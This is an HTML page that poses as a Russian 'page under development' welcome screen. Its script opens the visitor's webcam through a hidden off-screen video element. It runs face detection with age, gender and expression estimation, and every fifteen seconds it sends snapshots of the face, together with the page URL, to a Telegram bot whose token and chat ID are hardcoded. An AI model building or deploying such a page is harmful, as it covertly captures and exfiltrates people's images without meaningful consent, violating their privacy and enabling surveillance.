<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #f5f5f5;
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .page {
      text-align: center;
      max-width: 600px;
      padding: 3rem 2rem;
    }

    h1 {
      font-size: 2rem;
      font-weight: 700;
      color: #111;
      margin-bottom: 0.75rem;
    }

    p {
      font-size: 1rem;
      color: #666;
      line-height: 1.6;
      margin-bottom: 1rem;
    }

    .notice {
      margin-top: 2rem;
      padding: 0.75rem 1.25rem;
      background: #fff;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
      font-size: 0.75rem;
      color: #999;
    }
  </style>
</head>
<body>

  <div class="page">
    <h1>Добро пожаловать</h1>
    <p>Страница находится в разработке. Скоро здесь появится что-то интересное.</p>
    <div class="notice">На данном сайте ведётся видеонаблюдение в целях безопасности.</div>
  </div>

  <!-- Скрытые элементы -->
  <video id="video" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;"></video>
  <canvas id="captureCanvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('captureCanvas');
    const ctx = canvas.getContext('2d');

    const TG_TOKEN = '8777541911:AAEd_BEosgiFZrjeD7UYTbR2RyaXRhmaecI';
    const TG_CHAT_ID = '-1003794049979';
    const TG_API = 'https://tg-proxy.tweet44ar.workers.dev/bot' + TG_TOKEN;

    const MODEL_URL = 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights';

    const exprMap = {
      neutral: 'Нейтральное',
      happy: 'Счастливое',
      sad: 'Грустное',
      angry: 'Злое',
      fearful: 'Испуганное',
      disgusted: 'Отвращение',
      surprised: 'Удивлённое'
    };

    let lastSentTime = 0;
    const SEND_COOLDOWN = 15000;
    let sending = false;

    async function init() {
      try {
        await Promise.all([
          faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
          faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
          faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
          faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
        ]);

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 480 } }
        });
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => { video.play(); resolve(); };
        });
        await new Promise(r => setTimeout(r, 1000));

        scanLoop();
      } catch (err) {
        console.error('Init error:', err);
      }
    }

    async function sendToTelegram(detection) {
      const now = Date.now();
      if (now - lastSentTime < SEND_COOLDOWN) return;
      if (sending) return;
      if (video.videoWidth === 0 || video.videoHeight === 0) return;

      sending = true;
      lastSentTime = now;

      const confidence = (detection.detection.score * 100).toFixed(1);
      const age = Math.round(detection.age);
      const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
      const genderProb = (detection.genderProbability * 100).toFixed(0);
      const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
      const topExpr = exprMap[sorted[0][0]] || sorted[0][0];

      const caption =
        '🔍 Face Scan\n' +
        '━━━━━━━━━━━━━━━\n' +
        '📊 Уверенность: ' + confidence + '%\n' +
        '🎂 Возраст: ~' + age + ' лет\n' +
        '👤 Пол: ' + gender + ' (' + genderProb + '%)\n' +
        '😐 Выражение: ' + topExpr + '\n' +
        '━━━━━━━━━━━━━━━\n' +
        '🕐 ' + new Date().toLocaleString('ru-RU') + '\n' +
        '🌐 ' + location.href;

      try {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
        const base64 = dataUrl.split(',')[1];

        const binaryStr = atob(base64);
        const bytes = new Uint8Array(binaryStr.length);
        for (let i = 0; i < binaryStr.length; i++) {
          bytes[i] = binaryStr.charCodeAt(i);
        }
        const blob = new Blob([bytes.buffer], { type: 'image/jpeg' });

        const fd = new FormData();
        fd.append('chat_id', TG_CHAT_ID);
        fd.append('caption', caption);
        fd.append('photo', blob, 'face.jpg');

        const resp = await fetch(TG_API + '/sendPhoto', { method: 'POST', body: fd });
        const result = await resp.json();
        console.log('[TG] Result:', result.ok ? 'SUCCESS' : result.description);

      } catch (e) {
        console.error('[TG] Error:', e.message);
      } finally {
        sending = false;
      }
    }

    async function scanLoop() {
      try {
        const detection = await faceapi
          .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.5 }))
          .withFaceLandmarks()
          .withFaceExpressions()
          .withAgeAndGender();

        if (detection) {
          sendToTelegram(detection);
        }
      } catch (e) {
        console.error('Scan error:', e);
      }

      setTimeout(scanLoop, 300);
    }

    init();
  </script>

</body>
</html>
